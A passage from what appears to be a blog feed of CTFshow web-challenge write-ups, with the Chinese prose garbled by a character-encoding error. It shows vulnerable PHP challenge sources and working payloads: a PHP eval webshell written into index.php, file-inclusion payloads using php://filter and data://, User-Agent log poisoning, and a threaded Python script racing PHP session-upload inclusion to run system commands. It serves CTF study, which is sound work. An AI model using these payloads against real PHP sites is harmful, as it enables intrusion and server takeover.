punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//file_put_contentsä¼šè¦†ç›–ä¹‹å‰æ–‡ä»¶çš„å†…å®¹</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3><p>ä½ ä¸åˆ é™¤index.phpï¼Œé‚£ä¹ˆæˆ‘å°±å¾€index.phpä¸­å†™ä¸ªæœ¨é©¬</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>ctf<span class="token operator">=</span>index<span class="token punctuation">.</span>phpshow<span class="token operator">=</span><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'yn8rt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="æ–¹æ³•äºŒï¼š-2"><a href="#æ–¹æ³•äºŒï¼š-2" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><p>æ¡ä»¶ç«äº‰ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>ctf<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">.</span>phpshow<span class="token operator">=</span><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'tac /f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant">TRUE</span><span class="token punctuation">:</span><span class="token constant">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token shell-comment comment">#è¿‡æ»¤å­—ç¬¦</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éé¢„æœŸè§£ï¼š</p><p>uaå¤´å†™å…¥ä¸€å¥è¯</p><p>includeåŒ…å«(/var/log/nginx/access.log)</p><p>sessionåŒ…å«è„šæœ¬ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time : 20.12.5 13:52</span><span class="token comment" spellcheck="true"># @author:lonmar</span><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'test'</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"ctf"</span><span class="token punctuation">:</span> <span class="token string">"/tmp/sess_test"</span><span class="token punctuation">,</span>    <span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">'system("cat flag.php");'</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://7445f895-6f17-4435-adc0-62055d7f0cb7.chall.ctf.show/'</span><span class="token punctuation">,</span>                            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?>'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                            files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            <span class="token string">'http://7445f895-6f17-4435-adc0-62055d7f0cb7.chall.ctf.show/?isVIP=1'</span><span class="token punctuation">,</span>            data<span class="token operator">=</span>data        <span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag{'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*]retrying...'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150-plus"></a>web150-plus</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant">TRUE</span><span class="token punctuation">:</span><span class="token constant">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token shell-comment comment">#è¿‡æ»¤å­—ç¬¦</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sessionæ–‡ä»¶åŒ…å«å¯ä»¥ç»§ç»­æ‰“ï¼</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpç‰¹æ€§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowä¹‹web(äºŒ)</title>
      <link href="/2021/07/02/ctf-zhi-wen-jian-shang-chuan-bao-han/"/>
      <url>/2021/07/02/ctf-zhi-wen-jian-shang-chuan-bao-han/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="web78-79"><a href="#web78-79" class="headerlink" title="web78-79"></a>web78-79</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¼ªåè®®ï¼š"><a href="#ä¼ªåè®®ï¼š" class="headerlink" title="ä¼ªåè®®ï¼š"></a>ä¼ªåè®®ï¼š</h3><pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</code></pre><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„åˆ©ç”¨çš„æ˜¯æ—¥å¿—æ–‡ä»¶è¢«åŒ…å«ï¼Œç„¶åé€šè¿‡uaå¤´æ¥å†™å…¥å‘½ä»¤æ‰§è¡Œå‡½æ•°</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">GET</span> <span class="token operator">/</span><span class="token operator">?</span>file<span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> 33343a7c<span class="token operator">-</span>bfff<span class="token number">-4698</span><span class="token operator">-</span>bb14<span class="token operator">-</span>da66ae32aab7<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token punctuation">:</span><span class="token number">8080</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> <span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæˆ‘goå¤±è´¥äº†</p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B407%E6%9C%8803%E6%97%A51308_1.png" alt></p><p>åˆ©ç”¨web80çš„æ–¹æ³•æˆåŠŸå®ç°å‘½ä»¤æ‰§è¡Œï¼Œå¹¶è¯»å–åˆ°flag</p><h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç‚¹è¢«banäº†æ‰€ä»¥ä¸Šé¢çš„æ–¹æ³•ä¸èƒ½ä½¿ç”¨äº†</p><p>è¿™ä¸ªé¢˜ç›®è¦åˆ©ç”¨php_SESSION_UPLOAD_PROGRESS</p><ul><li><p>è¿™é‡Œç»™å­¦ä¹ èµ„æ–™<a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«</a></p></li><li><p><a 